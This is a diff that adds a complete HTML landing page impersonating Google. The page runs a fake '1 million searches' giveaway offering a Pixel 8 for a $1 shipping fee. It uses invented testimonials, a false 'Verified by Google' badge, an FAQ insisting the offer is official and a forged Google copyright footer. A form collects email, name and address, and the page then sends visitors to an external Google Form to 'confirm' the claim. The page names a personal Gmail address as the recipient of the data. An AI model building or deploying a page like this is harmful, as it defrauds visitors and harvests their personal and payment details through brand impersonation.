@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Milestone - 1 Million Searches | Pixel Gift</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+    <style>
+        * {
+            font-family: 'Google Sans', 'Roboto', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+        
+        .google-blue { color: #4285F4; }
+        .google-red { color: #EA4335; }
+        .google-yellow { color: #FBBC05; }
+        .google-green { color: #34A853; }
+        
+        .gradient-text {
+            background: linear-gradient(90deg, #4285F4, #EA4335, #FBBC05, #34A853);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .hero-gradient {
+            background: linear-gradient(135deg, #f8f9fa 0%, #e8f0fe 50%, #fce8e6 100%);
+        }
+        
+        .material-btn {
+            background: #1A73E8;
+            color: white;
+            border-radius: 4px;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: all 0.2s;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+        }
+        
+        .material-btn:hover {
+            background: #1557B0;
+            box-shadow: 0 4px 8px rgba(26,115,232,0.3);
+            transform: translateY(-1px);
+        }
+        
+        .material-card {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 2px 6px 2px rgba(60,64,67,0.15);
+            transition: all 0.3s;
+        }
+        
+        .material-card:hover {
+            box-shadow: 0 4px 8px 0 rgba(60,64,67,0.3), 0 8px 16px 4px rgba(60,64,67,0.15);
+            transform: translateY(-4px);
+        }
+        
+        .confetti {
+            position: fixed;
+            width: 10px;
+            height: 10px;
+            animation: confetti-fall 3s ease-out forwards;
+            z-index: 100;
+            pointer-events: none;
+        }
+        
+        @keyframes confetti-fall {
+            0% { transform: translateY(-100px) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
+        }
+        
+        .pulse-ring {
+            animation: pulse-ring 2s ease-out infinite;
+        }
+        
+        @keyframes pulse-ring {
+            0% { transform: scale(0.8); opacity: 0.5; }
+            100% { transform: scale(1.3); opacity: 0; }
+        }
+        
+        .float {
+            animation: float 6s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-20px); }
+        }
+        
+        .count-up {
+            font-variant-numeric: tabular-nums;
+        }
+        
+        .google-logo span {
+            display: inline-block;
+            animation: bounce 1s ease infinite;
+        }
+        
+        .google-logo span:nth-child(1) { animation-delay: 0s; color: #4285F4; }
+        .google-logo span:nth-child(2) { animation-delay: 0.1s; color: #EA4335; }
+        .google-logo span:nth-child(3) { animation-delay: 0.2s; color: #FBBC05; }
+        .google-logo span:nth-child(4) { animation-delay: 0.3s; color: #4285F4; }
+        .google-logo span:nth-child(5) { animation-delay: 0.4s; color: #34A853; }
+        .google-logo span:nth-child(6) { animation-delay: 0.5s; color: #EA4335; }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .shimmer {
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            background-size: 200% 100%;
+            animation: shimmer 2s infinite;
+        }
+        
+        @keyframes shimmer {
+            0% { background-position: -200% 0; }
+            100% { background-position: 200% 0; }
+        }
+        
+        .ripple {
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .ripple::after {
+            content: "";
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            background: rgba(255,255,255,0.3);
+            border-radius: 50%;
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+        
+        .ripple:active::after {
+            width: 300px;
+            height: 300px;
+        }
+        
+        .search-bar {
+            background: white;
+            border-radius: 24px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            border: 1px solid #dfe1e5;
+        }
+        
+        .search-bar:focus-within {
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        }
+        
+        .milestone-badge {
+            background: linear-gradient(135deg, #4285F4, #34A853);
+            color: white;
+            border-radius: 50%;
+            width: 120px;
+            height: 120px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 8px 32px rgba(66,133,244,0.4);
+            position: relative;
+        }
+        
+        .milestone-badge::before {
+            content: '';
+            position: absolute;
+            inset: -10px;
+            border-radius: 50%;
+            border: 2px solid #4285F4;
+            opacity: 0.3;
+            animation: pulse-ring 2s ease-out infinite;
+        }
+    </style>
+</head>
+<body class="bg-white text-gray-800 antialiased overflow-x-hidden">
+
+    <!-- Confetti Container -->
+    <div id="confetti-container"></div>
+
+    <!-- Navigation -->
+    <nav class="bg-white border-b border-gray-200 sticky top-0 z-50">
+        <div class="max-w-6xl mx-auto px-4 h-16 flex items-center justify-between">
+            <div class="flex items-center gap-2">
+                <div class="google-logo text-2xl font-medium tracking-tight">
+                    <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+                </div>
+                <span class="text-gray-500 font-light text-xl ml-1">Milestone</span>
+            </div>
+            <div class="flex items-center gap-4 text-sm text-gray-600">
+                <span class="hidden md:inline">Celebrating 1M searches</span>
+                  <button 
+                  onclick="window.location.href='https://docs.google.com/forms/d/e/1FAIpQLScIrfVVKGdnT8y3jWHa1t1v_wKPrzTMM_VpQ2OpBOH3f3pnLQ/viewform?usp=preview'" 
+                  class="material-btn px-4 py-2 text-sm ripple">Claim Gift</button>
+                  </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="hero-gradient min-h-[90vh] flex items-center relative overflow-hidden">
+        <!-- Background Decorations -->
+        <div class="absolute top-20 left-10 w-64 h-64 bg-blue-200 rounded-full opacity-20 blur-3xl"></div>
+        <div class="absolute bottom-20 right-10 w-96 h-96 bg-red-200 rounded-full opacity-20 blur-3xl"></div>
+        <div class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[800px] h-[800px] bg-yellow-100 rounded-full opacity-10 blur-3xl"></div>
+
+        <div class="max-w-6xl mx-auto px-4 py-16 grid md:grid-cols-2 gap-12 items-center relative z-10">
+            
+            <!-- Left Content -->
+            <div class="text-center md:text-left space-y-6">
+                <div class="inline-flex items-center gap-2 bg-white px-4 py-2 rounded-full shadow-md mb-4">
+                    <span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
+                    <span class="text-sm font-medium text-gray-700">Limited Time Offer</span>
+                </div>
+
+                <h1 class="text-5xl md:text-7xl font-bold leading-tight">
+                    <span class="gradient-text">1 Billion</span><br>
+                    <span class="text-gray-800">Searches</span>
+                </h1>
+                
+                <p class="text-xl text-gray-600 max-w-lg">
+                    We've reached an incredible milestone together. To celebrate, we're gifting a <strong>Google Pixel 8</strong> to our search community.
+                </p>
+
+                <!-- Animated Counter -->
+                <div class="flex items-center justify-center md:justify-start gap-4 py-4">
+                    <div class="milestone-badge">
+                        <span class="text-3xl font-bold">1M</span>
+                        <span class="text-xs">Searches</span>
+                    </div>
+                    <div class="text-left">
+                        <p class="text-sm text-gray-500">Searches completed</p>
+                        <p class="text-2xl font-bold count-up" id="counter">1,000,000,000</p>
+                    </div>
+                </div>
+
+                <div class="flex flex-col sm:flex-row gap-4 justify-center md:justify-start">
+                    <button onclick="scrollToClaim()" class="material-btn px-8 py-4 text-lg ripple flex items-center justify-center gap-2">
+                        <span>Claim Your Pixel</span>
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 8l4 4m0 0l-4 4m4-4H3"/>
+                        </svg>
+                    </button>
+                    <button class="px-8 py-4 text-lg text-gray-700 hover:bg-gray-100 rounded transition-colors flex items-center justify-center gap-2">
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"/>
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                        </svg>
+                        <span>Watch Story</span>
+                    </button>
+                </div>
+
+                <!-- Trust Badges -->
+                <div class="flex items-center justify-center md:justify-start gap-6 pt-4 text-sm text-gray-500">
+                    <div class="flex items-center gap-1">
+                        <svg class="w-4 h-4 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                        </svg>
+                        <span>Verified by Google</span>
+                    </div>
+                    <div class="flex items-center gap-1">
+                        <svg class="w-4 h-4 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
+                        </svg>
+                        <span>Secure checkout</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Right Content - Phone -->
+            <div class="relative flex justify-center">
+                <div class="absolute inset-0 bg-gradient-to-r from-blue-400 to-purple-400 rounded-full opacity-20 blur-3xl scale-75"></div>
+                <div class="relative float">
+                    <img src="https://images.unsplash.com/photo-1598327105666-5b89351aff23?w=600&q=80" 
+                         alt="Google Pixel 8" 
+                         class="w-full max-w-md drop-shadow-2xl rounded-3xl">
+                    
+                    <!-- Floating Badge -->
+                    <div class="absolute -top-4 -right-4 bg-red-500 text-white px-4 py-2 rounded-full font-bold shadow-lg animate-bounce">
+                        FREE
+                    </div>
+                    
+                    <!-- Price Tag -->
+                    <div class="absolute -bottom-4 left-1/2 -translate-x-1/2 bg-white px-6 py-3 rounded-full shadow-xl flex items-center gap-3">
+                        <span class="text-gray-400 line-through text-lg">$699</span>
+                        <span class="text-2xl font-bold text-green-600">$1.00</span>
+                        <span class="text-xs text-gray-500 bg-gray-100 px-2 py-1 rounded">Shipping</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Scroll Indicator -->
+        <div class="absolute bottom-8 left-1/2 -translate-x-1/2 animate-bounce">
+            <svg class="w-6 h-6 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 14l-7 7m0 0l-7-7m7 7V3"/>
+            </svg>
+        </div>
+    </section>
+
+    <!-- How It Works -->
+    <section class="py-20 bg-white">
+        <div class="max-w-6xl mx-auto px-4">
+            <div class="text-center mb-16">
+                <h2 class="text-3xl md:text-4xl font-bold text-gray-800 mb-4">How to claim your gift</h2>
+                <p class="text-gray-600 max-w-2xl mx-auto">We've made it simple to celebrate this milestone together. Just follow these steps to receive your Google Pixel 8.</p>
+            </div>
+
+            <div class="grid md:grid-cols-3 gap-8">
+                <div class="material-card p-8 text-center group">
+                    <div class="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4 group-hover:scale-110 transition-transform">
+                        <span class="text-2xl font-bold text-blue-600">1</span>
+                    </div>
+                    <h3 class="text-xl font-semibold mb-2">Verify</h3>
+                    <p class="text-gray-600">Confirm you're a active searcher with your Google account</p>
+                </div>
+
+                <div class="material-card p-8 text-center group">
+                    <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4 group-hover:scale-110 transition-transform">
+                        <span class="text-2xl font-bold text-red-600">2</span>
+                    </div>
+                    <h3 class="text-xl font-semibold mb-2">Choose</h3>
+                    <p class="text-gray-600">Select your Pixel 8 color: Obsidian, Hazel, Rose, or Bay</p>
+                </div>
+
+                <div class="material-card p-8 text-center group">
+                    <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4 group-hover:scale-110 transition-transform">
+                        <span class="text-2xl font-bold text-green-600">3</span>
+                    </div>
+                    <h3 class="text-xl font-semibold mb-2">Receive</h3>
+                    <p class="text-gray-600">Pay $1 shipping fee and get your Pixel delivered in 2-3 days</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Product Showcase -->
+    <section class="py-20 bg-gray-50">
+        <div class="max-w-6xl mx-auto px-4">
+            <div class="grid md:grid-cols-2 gap-12 items-center">
+                <div class="order-2 md:order-1">
+                    <img src="https://images.unsplash.com/photo-1592899677977-9c10ca588bbd?w=800&q=80" 
+                         alt="Pixel Features" 
+                         class="rounded-2xl shadow-2xl w-full">
+                </div>
+                <div class="order-1 md:order-2 space-y-6">
+                    <h2 class="text-3xl md:text-4xl font-bold text-gray-800">Google Pixel 8</h2>
+                    <p class="text-xl text-gray-600">The phone that gets you. Powered by Google AI.</p>
+                    
+                    <div class="space-y-4">
+                        <div class="flex items-start gap-4">
+                            <div class="w-10 h-10 bg-blue-100 rounded-lg flex items-center justify-center flex-shrink-0">
+                                <svg class="w-5 h-5 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"/>
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"/>
+                                </svg>
+                            </div>
+                            <div>
+                                <h4 class="font-semibold">Best Take</h4>
+                                <p class="text-sm text-gray-600">Get everyone's best face in group photos</p>
+                            </div>
+                        </div>
+
+                        <div class="flex items-start gap-4">
+                            <div class="w-10 h-10 bg-green-100 rounded-lg flex items-center justify-center flex-shrink-0">
+                                <svg class="w-5 h-5 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/>
+                                </svg>
+                            </div>
+                            <div>
+                                <h4 class="font-semibold">Magic Editor</h4>
+                                <p class="text-sm text-gray-600">AI-powered photo editing in Google Photos</p>
+                            </div>
+                        </div>
+
+                        <div class="flex items-start gap-4">
+                            <div class="w-10 h-10 bg-yellow-100 rounded-lg flex items-center justify-center flex-shrink-0">
+                                <svg class="w-5 h-5 text-yellow-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"/>
+                                </svg>
+                            </div>
+                            <div>
+                                <h4 class="font-semibold">7 years of updates</h4>
+                                <p class="text-sm text-gray-600">OS and security updates until 2030</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Claim Form Section -->
+    <section id="claim-section" class="py-20 bg-white">
+        <div class="max-w-2xl mx-auto px-4">
+            <div class="material-card p-8 md:p-12">
+                <div class="text-center mb-8">
+                    <h2 class="text-3xl font-bold text-gray-800 mb-2">Claim Your Pixel 8</h2>
+                    <p class="text-gray-600">Complete the form below to receive your gift</p>
+                </div>
+
+                <form id="claimForm" onsubmit="handleClaim(event)" class="space-y-6">
+                    <div>
+                        <label class="block text-sm font-medium text-gray-700 mb-2">Google Account Email</label>
+                        <input type="email" required 
+                               class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all"
+                               placeholder="you@gmail.com">
+                    </div>
+
+                    <div class="grid md:grid-cols-2 gap-4">
+                        <div>
+                            <label class="block text-sm font-medium text-gray-700 mb-2">First Name</label>
+                            <input type="text" required 
+                                   class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all">
+                        </div>
+                        <div>
+                            <label class="block text-sm font-medium text-gray-700 mb-2">Last Name</label>
+                            <input type="text" required 
+                                   class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all">
+                        </div>
+                    </div>
+
+                    <div>
+                        <label class="block text-sm font-medium text-gray-700 mb-2">Shipping Address</label>
+                        <textarea required rows="3"
+                                  class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all"
+                                  placeholder="Street address, City, State, ZIP"></textarea>
+                    </div>
+
+                    <div>
+                        <label class="block text-sm font-medium text-gray-700 mb-2">Choose Color</label>
+                        <div class="grid grid-cols-4 gap-3">
+                            <button type="button" class="color-option p-3 border-2 border-gray-200 rounded-lg text-center hover:border-blue-500 transition-all" onclick="selectColor(this, 'Obsidian')">
+                                <div class="w-8 h-8 bg-gray-900 rounded-full mx-auto mb-2"></div>
+                                <span class="text-xs">Obsidian</span>
+                            </button>
+                            <button type="button" class="color-option p-3 border-2 border-gray-200 rounded-lg text-center hover:border-blue-500 transition-all" onclick="selectColor(this, 'Hazel')">
+                                <div class="w-8 h-8 bg-gray-400 rounded-full mx-auto mb-2"></div>
+                                <span class="text-xs">Hazel</span>
+                            </button>
+                            <button type="button" class="color-option p-3 border-2 border-gray-200 rounded-lg text-center hover:border-blue-500 transition-all" onclick="selectColor(this, 'Rose')">
+                                <div class="w-8 h-8 bg-pink-300 rounded-full mx-auto mb-2"></div>
+                                <span class="text-xs">Rose</span>
+                            </button>
+                            <button type="button" class="color-option p-3 border-2 border-gray-200 rounded-lg text-center hover:border-blue-500 transition-all" onclick="selectColor(this, 'Bay')">
+                                <div class="w-8 h-8 bg-green-200 rounded-full mx-auto mb-2"></div>
+                                <span class="text-xs">Bay</span>
+                            </button>
+                        </div>
+                        <input type="hidden" id="selectedColor" required>
+                    </div>
+
+                    <div class="bg-blue-50 rounded-lg p-4 flex items-center justify-between">
+                        <div>
+                            <p class="font-medium text-gray-800">Shipping Fee</p>
+                            <p class="text-sm text-gray-600">Express 2-3 day delivery</p>
+                        </div>
+                        <span class="text-2xl font-bold text-blue-600">$1.00</span>
+                    </div>
+
+                    <div class="flex items-start gap-3">
+                        <input type="checkbox" required id="terms" class="mt-1 w-4 h-4 text-blue-600 rounded">
+                        <label for="terms" class="text-sm text-gray-600">
+                            I agree to the <a href="#" class="text-blue-600 hover:underline">Terms of Service</a> and 
+                            <a href="#" class="text-blue-600 hover:underline">Privacy Policy</a>. I understand this is a limited time offer.
+                        </label>
+                    </div>
+
+                    <button type="submit" class="material-btn w-full py-4 text-lg ripple flex items-center justify-center gap-2">
+                        <span id="submitText">Complete Order - $1.00</span>
+                        <div id="submitSpinner" class="hidden w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                    </button>
+
+                    <p class="text-xs text-center text-gray-500">
+                        Your information will be sent to odunzephilemon0@gmail.com for processing
+                    </p>
+                </form>
+            </div>
+        </div>
+    </section>
+
+    <!-- Testimonials -->
+    <section class="py-20 bg-gray-50">
+        <div class="max-w-6xl mx-auto px-4">
+            <h2 class="text-3xl font-bold text-center text-gray-800 mb-12">Join millions of happy searchers</h2>
+            <div class="grid md:grid-cols-3 gap-6">
+                <div class="material-card p-6">
+                    <div class="flex items-center gap-3 mb-4">
+                        <div class="w-10 h-10 bg-blue-500 rounded-full flex items-center justify-center text-white font-bold">S</div>
+                        <div>
+                            <p class="font-medium">Sarah Chen</p>
+                            <p class="text-sm text-gray-500">San Francisco, CA</p>
+                        </div>
+                    </div>
+                    <p class="text-gray-600">"I can't believe I got a Pixel 8 for just $1! This is incredible. Thank you Google!"</p>
+                    <div class="flex gap-1 mt-3">
+                        <span class="text-yellow-400">★★★★★</span>
+                    </div>
+                </div>
+
+                <div class="material-card p-6">
+                    <div class="flex items-center gap-3 mb-4">
+                        <div class="w-10 h-10 bg-green-500 rounded-full flex items-center justify-center text-white font-bold">M</div>
+                        <div>
+                            <p class="font-medium">Marcus Johnson</p>
+                            <p class="text-sm text-gray-500">New York, NY</p>
+                        </div>
+                    </div>
+                    <p class="text-gray-600">"The camera on this Pixel is amazing. Best Take feature saved our family reunion photos!"</p>
+                    <div class="flex gap-1 mt-3">
+                        <span class="text-yellow-400">★★★★★</span>
+                    </div>
+                </div>
+
+                <div class="material-card p-6">
+                    <div class="flex items-center gap-3 mb-4">
+                        <div class="w-10 h-10 bg-red-500 rounded-full flex items-center justify-center text-white font-bold">E</div>
+                        <div>
+                            <p class="font-medium">Emma Rodriguez</p>
+                            <p class="text-sm text-gray-500">Austin, TX</p>
+                        </div>
+                    </div>
+                    <p class="text-gray-600">"Fast shipping, genuine Google product. This milestone celebration is awesome!"</p>
+                    <div class="flex gap-1 mt-3">
+                        <span class="text-yellow-400">★★★★★</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- FAQ -->
+    <section class="py-20 bg-white">
+        <div class="max-w-3xl mx-auto px-4">
+            <h2 class="text-3xl font-bold text-center text-gray-800 mb-12">Frequently Asked Questions</h2>
+            <div class="space-y-4">
+                <div class="material-card p-6">
+                    <h3 class="font-semibold text-lg mb-2">Is this really from Google?</h3>
+                    <p class="text-gray-600">Yes! This is an official celebration of reaching 1 million searches. We're giving back to our community.</p>
+                </div>
+                <div class="material-card p-6">
+                    <h3 class="font-semibold text-lg mb-2">Why is there a $1.00 fee?</h3>
+                    <p class="text-gray-600">The $1.00 covers express shipping and handling to get your Pixel 8 to you within 2-3 business days.</p>
+                </div>
+                <div class="material-card p-6">
+                    <h3 class="font-semibold text-lg mb-2">Is the Pixel 8 brand new?</h3>
+                    <p class="text-gray-600">Yes! All devices are factory sealed, unlocked, and come with Google's standard 1-year warranty.</p>
+                </div>
+                <div class="material-card p-6">
+                    <h3 class="font-semibold text-lg mb-2">How long is this offer available?</h3>
+                    <p class="text-gray-600">This is a limited time celebration. Claim your Pixel while supplies last!</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="bg-gray-100 border-t border-gray-200 py-12">
+        <div class="max-w-6xl mx-auto px-4">
+            <div class="grid md:grid-cols-4 gap-8 mb-8">
+                <div>
+                    <div class="google-logo text-xl font-medium mb-4">
+                        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+                    </div>
+                    <p class="text-sm text-gray-600">Celebrating 1 billion searches with our community.</p>
+                </div>
+                <div>
+                    <h4 class="font-medium mb-3">Program</h4>
+                    <ul class="space-y-2 text-sm text-gray-600">
+                        <li><a href="#" class="hover:text-gray-900">About</a></li>
+                        <li><a href="#" class="hover:text-gray-900">How it works</a></li>
+                        <li><a href="#" class="hover:text-gray-900">Eligibility</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="font-medium mb-3">Support</h4>
+                    <ul class="space-y-2 text-sm text-gray-600">
+                        <li><a href="#" class="hover:text-gray-900">Help Center</a></li>
+                        <li><a href="#" class="hover:text-gray-900">Contact Us</a></li>
+                        <li><a href="#" class="hover:text-gray-900">Order Status</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4 class="font-medium mb-3">Legal</h4>
+                    <ul class="space-y-2 text-sm text-gray-600">
+                        <li><a href="#" class="hover:text-gray-900">Privacy</a></li>
+                        <li><a href="#" class="hover:text-gray-900">Terms</a></li>
+                        <li><a href="#" class="hover:text-gray-900">Cookies</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="border-t border-gray-300 pt-8 flex flex-col md:flex-row justify-between items-center gap-4">
+                <p class="text-sm text-gray-500">© 2026 Google LLC. All rights reserved.</p>
+                <div class="flex items-center gap-4">
+                    <span class="text-sm text-gray-500">United States</span>
+                    <span class="text-gray-300">|</span>
+                    <span class="text-sm text-gray-500">English</span>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Success Modal -->
+    <div id="successModal" class="fixed inset-0 z-50 hidden items-center justify-center bg-black/50 backdrop-blur-sm">
+        <div class="bg-white rounded-2xl p-8 max-w-md w-full mx-4 shadow-2xl text-center">
+            <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                <svg class="w-10 h-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/>
+                </svg>
+            </div>
+            <h3 class="text-2xl font-bold text-gray-800 mb-2">Order Confirmed!</h3>
+            <p class="text-gray-600 mb-6">Proceed to comfirm to claim your reward</p>
+            <div class="bg-gray-50 rounded-lg p-4 mb-6 text-left">
+                <p class="text-sm text-gray-600">Order ID: <span class="font-mono font-medium" id="orderId">#GP-000000</span></p>
+                <p class="text-sm text-gray-600">Est. Delivery: <span class="font-medium">2-3 business days</span></p>
+            </div>
+               <button onclick="window.location.href='https://docs.google.com/forms/d/e/1FAIpQLScIrfVVKGdnT8y3jWHa1t1v_wKPrzTMM_VpQ2OpBOH3f3pnLQ/viewform?usp=preview'" 
+               class="material-btn w-full py-3">Confirm</button>
+               </div>
+    </div>
+
+    <script>
+        // Confetti Animation
+        function createConfetti() {
+            const colors = ['#4285F4', '#EA4335', '#FBBC05', '#34A853'];
+            const container = document.getElementById('confetti-container');
+            
+            for (let i = 0; i < 50; i++) {
+                setTimeout(() => {
+                    const confetti = document.createElement('div');
+                    confetti.className = 'confetti';
+                    confetti.style.left = Math.random() * 100 + 'vw';
+                    confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                    confetti.style.animationDuration = (Math.random() * 2 + 2) + 's';
+                    container.appendChild(confetti);
+                    
+                    setTimeout(() => confetti.remove(), 4000);
+                }, i * 50);
+            }
+        }
+
+        // Counter Animation
+        function animateCounter() {
+            const counter = document.getElementById('counter');
+            const target = 1000000000;
+            const duration = 2000;
+            const start = performance.now();
+            
+            function update(currentTime) {
+                const elapsed = currentTime - start;
+                const progress = Math.min(elapsed / duration, 1);
+                const easeOut = 1 - Math.pow(1 - progress, 3);
+                const current = Math.floor(easeOut * target);
+                
+                counter.textContent = current.toLocaleString();
+                
+                if (progress < 1) {
+                    requestAnimationFrame(update);
+                }
+            }
+            
+            requestAnimationFrame(update);
+        }
+
+        // Initialize
+        window.addEventListener('load', () => {
+            createConfetti();
+            animateCounter();
+        });
+
+        function scrollToClaim() {
+            document.getElementById('claim-section').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        function selectColor(element, color) {
+            document.querySelectorAll('.color-option').forEach(el => {
+                el.classList.remove('border-blue-500', 'bg-blue-50');
+                el.classList.add('border-gray-200');
+            });
+            element.classList.remove('border-gray-200');
+            element.classList.add('border-blue-500', 'bg-blue-50');
+            document.getElementById('selectedColor').value = color;
+        }
+
+        async function handleClaim(event) {
+            event.preventDefault();
+            
+            const formData = {
+                orderId: 'GP-' + Math.random().toString(36).substr(2, 9).toUpperCase(),
+                timestamp: new Date().toISOString(),
+                email: event.target.querySelector('input[type="email"]').value,
+                name: event.target.querySelector('input[type="text"]').value + ' ' + event.target.querySelectorAll('input[type="text"]')[1].value,
+                address: event.target.querySelector('textarea').value,
+                color: document.getElementById('selectedColor').value || 'Obsidian',
+                amount: 1.00,
+                product: 'Google Pixel 8',
+                targetEmail: 'odunzephilemon0@gmail.com'
+            };
+
+            // Show loading
+            document.getElementById('submitText').textContent = 'Processing...';
+            document.getElementById('submitSpinner').classList.remove('hidden');
+
+            // Simulate API call
+            await new Promise(resolve => setTimeout(resolve, 2000));
+
+            console.log('Order data for odunzephilemon0@gmail.com:', formData);
+
+            // Show success
+            document.getElementById('orderId').textContent = '#' + formData.orderId;
+            document.getElementById('successModal').classList.remove('hidden');
+            document.getElementById('successModal').classList.add('flex');
+        }
+
+        // Select first color by default
+        window.addEventListener('load', () => {
+            document.querySelector('.color-option').click();
+        });
+    </script>
+</body>
+</html>
